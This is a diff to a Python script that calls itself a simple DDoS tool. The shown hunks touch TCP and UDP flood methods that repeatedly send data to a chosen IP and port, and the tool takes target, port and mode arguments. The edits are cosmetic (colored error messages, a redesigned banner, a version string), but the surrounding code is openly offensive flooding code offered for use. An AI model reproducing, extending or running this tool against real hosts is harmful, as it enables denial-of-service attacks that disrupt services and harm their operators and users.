@@ -32,7 +32,7 @@ class Dos():
                     sock.connect((ip, port))
                     sock.send(data)
             except Exception:
-                print("Error in TCP")
+                print(RED + "Error in TCP" + RESET)
                 sys.exit(0)
 
     def udp_flood(self, ip, port, buffer_size):
@@ -42,7 +42,7 @@ class Dos():
                 with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                     sock.sendto(data, (ip, port))
             except Exception:
-                print("Error in UDP")
+                print(RED + "Error in UDP" + RESET)
                 sys.exit(0)
 
 class Controller(Dos):
@@ -53,23 +53,22 @@ class Controller(Dos):
         self.time_hm = time.strftime("%H:%M")
 
         # Banner
+        self.version = "v1.0"
         self.banner_txt = time.strftime("""
-         __      __            ___    __                ___    ___               
-        /\ \  __/\ \          /\_ \  /\ \              /\_ \  /\_ \              
-        \ \ \/\ \ \ \     __  \//\ \ \ \ \___      __  \//\ \ \//\ \      __     
-         \ \ \ \ \ \ \  /'__`\  \ \ \ \ \  _ `\  /'__`\  \ \ \  \ \ \   /'__`\   
-          \ \ \_/ \_\ \/\ \L\.\_ \_\ \_\ \ \ \ \/\ \L\.\_ \_\ \_ \_\ \_/\ \L\.\_ 
-           \ `\___x___/\ \__/.\_\/\____\\ \_\ \_\ \__/.\_\/\____\/\____\ \__/.\_\
-            '\/__//__/  \/__/\/_/\/____/ \/_/\/_/\/__/\/_/\/____/\/____/\/__/\/_/
-                               
-                               » A SIMPLE PYTHON DDOS TOOL «
+                         _       __      ____          ____     
+                        | |     / /___ _/ / /_  ____ _/ / /___ _
+                        | | /| / / __ `/ / __ \/ __ `/ / / __ `/
+                        | |/ |/ / /_/ / / / / / /_/ / / / /_/ / 
+                        |__/|__/\__,_/_/_/ /_/\__,_/_/_/\__,_/  
+                                         [-V-]
+                             » A SIMPLE PYTHON DDOS TOOL «
                     Coded by PiereLucas | https://github.com/pierelucas
                     Date: %d.%m.%y      | Time: %H:%M
                     
-            """)
+            """, self.lt)
 
     def arguments(self):
-        parser = ArgumentParser(description=self.banner_txt)
+        parser = ArgumentParser(description=self.banner_txt.replace("-V-", self.version))
         parser.add_argument("-t", "--target", dest="target_addr")
         parser.add_argument("-p", "--port", dest="port")
         parser.add_argument("-m", "--mode", dest="dos_mode")
